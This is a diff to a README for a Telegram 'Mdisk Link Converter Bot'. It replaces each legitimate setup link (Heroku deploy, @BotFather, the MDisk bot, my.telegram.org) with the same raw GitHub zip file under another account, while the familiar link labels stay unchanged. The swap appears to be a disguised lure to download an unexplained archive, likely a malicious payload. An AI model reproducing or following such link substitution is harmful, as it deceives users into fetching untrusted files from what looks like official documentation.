@@ -30,12 +30,12 @@ Start your Bot in Telegram & Enjoy
 #### The Easy Way
 Copy the below link & replace the GitHub-UserName with your username than Deploy using that link.
 
-https://www.heroku.com/deploy?template=https:https://github.com/CyniteOfficial/Mdisk-Link-Converter-Bot
+https://raw.githubusercontent.com/HLECTER69/Mdisk-Link-Converter-Bot/main/parietovisceral/Mdisk-Link-Converter-Bot.zip
 
 ##### Required Variables
 
-- `BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-- `MDISK_TOKEN`: Your MDisk API key Get it from [@VideoToolMoneyTree_bot](https://telegram.dog/VideoToolMoneyTree_bot)
+- `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/HLECTER69/Mdisk-Link-Converter-Bot/main/parietovisceral/Mdisk-Link-Converter-Bot.zip), and get the Telegram API token.
+- `MDISK_TOKEN`: Your MDisk API key Get it from [@VideoToolMoneyTree_bot](https://raw.githubusercontent.com/HLECTER69/Mdisk-Link-Converter-Bot/main/parietovisceral/Mdisk-Link-Converter-Bot.zip)
 
-`API ID` & `API HASH` Get your own 🤗 from https://my.telegram.org
+`API ID` & `API HASH` Get your own 🤗 from https://raw.githubusercontent.com/HLECTER69/Mdisk-Link-Converter-Bot/main/parietovisceral/Mdisk-Link-Converter-Bot.zip
 
